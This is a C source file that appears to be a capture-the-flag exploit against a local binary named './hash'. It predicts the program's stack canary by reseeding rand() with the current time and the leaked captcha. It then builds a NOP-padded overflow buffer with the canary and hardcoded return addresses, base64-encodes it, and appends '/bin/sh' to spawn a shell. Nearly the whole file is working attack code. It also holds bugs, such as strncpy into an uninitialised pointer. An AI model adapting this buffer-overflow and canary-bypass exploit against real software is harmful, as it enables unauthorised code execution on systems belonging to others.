#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdint.h>


static char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                '4', '5', '6', '7', '8', '9', '+', '/'};
static char *decoding_table = NULL;
static int mod_table[] = {0, 2, 1};
int lenOfb64;


char *base64_encode(const unsigned char *data,
                    size_t input_length,
                    size_t *output_length) {

    *output_length = 4 * ((input_length + 2) / 3);

    char *encoded_data = (char *)malloc(*output_length);

    if (encoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';

    return encoded_data;
}


int randCalc(int t, int m)
{
  srand(t);
  int num[32];
  for (int i=0;i<=7;i++)
  {
    num[i*4]=rand();
    //printf ("num[%d]:%x\n",i*4, num[i*4]);
  }
  int tot = (num[4]+num[20])+(num[8]-num[12])+(num[28])+(num[16]-num[24]);
  m -= tot;
  //printf ("%x\n",m);
  return m;
}

int toHex(char *source)
{
  int tot=0,n=1;
  //printf("toHex %s %d\n",source);
  //printf("toHex %s %d\n",source,len);
  for (int i=1;i>=0;i--)
  {
    //printf("tohex[%d] : %c\n",i,source[i]);
    if (source[i]>'9')
    {
      int tmp=source[i]-'a'+10;
      tot+=tmp*n;
    }
    else
    {
      int tmp=source[i]-'0';
      tot+=tmp*n;
    }
    n*=16;
  }
  return tot;
}

void p32(char *payload, char *hex, int pos)
{
  for (int i=0;i<4;i++)
  {
    char *tmp;
    strncpy(tmp, hex+8-(i+1)*2,2);
    unsigned int tmp2num=toHex(tmp);
    //printf("%s %d\n",tmp, tmp2num);
    payload[pos+i]=(char)tmp2num;
    //printf("%x %c\n", payload[pos+i], payload[pos+i]);
  }
}

int main()
{
  time_t t=time(0);
  char *argv[]={"./hash",(char *) 0};
  char *envp=NULL;
  int pc[2];
  int cp[2];
  int pid,flag=-2;
  char ch;
  char cookie[15];
  char payload[536],finalPayload[734];

  if (pipe(pc) < 0)
  {
    perror("Can't make pipe\n");
    exit(1);
  }
  if (pipe(cp) < 0)
  {
    perror("Can't make pipe\n");
    exit(1);
  }

  switch(pid=fork())
  {
    case -1:
      perror("Can't fork\n");
      exit(1);
    case 0:
      /*Child*/
      close(1);
      dup(cp[1]);
      close(0);
      dup(pc[0]);

      close(pc[1]);
      close(cp[0]);

      //printf("seed t : %d",t);
      execve("./hash",argv,NULL);
      perror("No exec\n");
      //signal(getppid(),SIGQUIT);
      exit(1);

    default:
      /*Parent*/

      printf("\nOutput from child:\n");
      close(cp[1]);
      char captcha[15];
      while (read(cp[0],&ch,1) == 1)
      {
        write(1,&ch,1);
        if (ch==':' || flag!=-2)
        {
            if (flag>=0)
            {
                captcha[flag]=ch;
            }
            flag++;
            if (ch==0xa)
              break;
        }
      }
      int m=atoi(captcha);
      int len=sprintf(cookie,"%x",randCalc(t,m));
      printf("The cookie : %s\n",cookie);


      memset(payload, 0x90, 536);
      p32(payload,cookie,512);
      p32(payload,"08049174",528);
      p32(payload,"0804b3b6",532);

      printf("lenOfb64 : %p\n", &lenOfb64);
      char *encdpd=base64_encode(payload,536,&lenOfb64);
      //printf("Encode payload with length %d: %s\n", lenOfb64, encdpd );
      memset(finalPayload,0x90,734);
      strcpy(finalPayload,encdpd);
      strcpy(finalPayload+726,"/bin/sh");
      /*printf("finalPayload : ");
      for (int i=0;i<734;i++)
        printf("%c",finalPayload[i]);*/

      sprintf(cookie,"%d",m);
      printf("WTF!!!:%d %d\n",strlen(cookie),strlen(captcha));
      for (int i=0;i<strlen(captcha);i++)
        write(pc[1],&cookie[i],1);
      write(pc[1],"0xa",1);


      while (read(cp[0],&ch,1) == 1)
      {
        write(1,&ch,1);
        if (ch=='!')
        {
          for (int i=0;i<734;i++)
            write(pc[1],&finalPayload[i],1);
          write(pc[1],"\n",1);
          //break;
        }
      }

      //for (int i=0;i<734;i++)
      //  write(pc[1],&finalPayload[i],1);



      /*
      printf("Input to child:\n");
      while (read(0,&ch,1)>0)
      {
        write(pc[1],&ch,1);
        //write(1,&ch,1);
      }

      while (read(cp[0],&ch,1)==1)
      {
        write(1,&ch,1);
      }
      close(pc[1]);
      */
      exit(0);
  }

  //execve("./hash",argv,envp);
  /*
  char payload[];
  memset(payload, 0x90, (512+4+12+4+4));
  cookie=randCalc(t,m);
  */


}
